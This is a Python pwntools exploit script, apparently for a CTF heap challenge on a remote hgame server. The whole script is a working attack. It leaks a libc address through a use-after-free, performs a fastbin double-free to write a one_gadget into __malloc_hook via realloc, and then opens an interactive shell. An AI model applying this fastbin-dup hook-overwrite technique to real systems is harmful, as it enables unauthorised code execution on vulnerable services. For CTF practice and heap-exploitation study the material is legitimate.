from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

# sh = process(["./vuln"])
sh = remote("week-2.hgame.lwsec.cn", 32320)
elf = ELF("./vuln")
libc = ELF("./libc-2.23.so")
# libc = ELF("/home/nova/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")


def add(idx: int, size: int, content: bytes):
    sh.sendlineafter(b'4. Exit', b'1')
    sh.sendlineafter(b'Index: ', str(idx).encode())
    sh.sendlineafter(b'Size: ', str(size).encode())
    sh.sendafter(b'Content: ', content)


def delete(idx: int):
    sh.sendlineafter(b'4. Exit', b'2')
    sh.sendlineafter(b'Index: ', str(idx).encode())


def show(idx: int):
    sh.sendlineafter(b'4. Exit', b'3')
    sh.sendlineafter(b'Index: ', str(idx).encode())



add(0, 0xF0, b'AAAA\n')
add(1, 0x10, b'AAA\n')
add(2, 0x60, b'\n')
add(3, 0x60, b'\n')
delete(0)
show(0)
libc_base = u64(sh.recv(6).ljust(8, b'\x00')) - 0x3c4b78
malloc_hook_addr = libc_base + libc.sym['__malloc_hook']
system_addr = libc_base + libc.sym['system']
realloc_hook_addr = libc_base + libc.sym['__realloc_hook']
realloc_addr = libc_base + libc.sym['realloc']
one_gadget = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
og = libc_base + one_gadget[3]

delete(2)
delete(3)
delete(2)

add(4, 0x60, p64(malloc_hook_addr-0x23) + b'\n')
add(5, 0x60, b'\n')
add(6, 0x60, b'\n')
add(7, 0x60, b'\x00' * 0xB + p64(og) + p64(realloc_addr+6))

# gdb.attach(sh, f'b *{hex(libc_base+0xf125d)}') # \nb *0x4009f2'
print(hex(libc_base))
print(hex(malloc_hook_addr))
print(hex(realloc_hook_addr))
# pause()
sh.sendlineafter(b'4. Exit', b'1')
sh.sendlineafter(b'Index: ', b'8')
sh.sendlineafter(b'Size: ', b'32')
sh.interactive()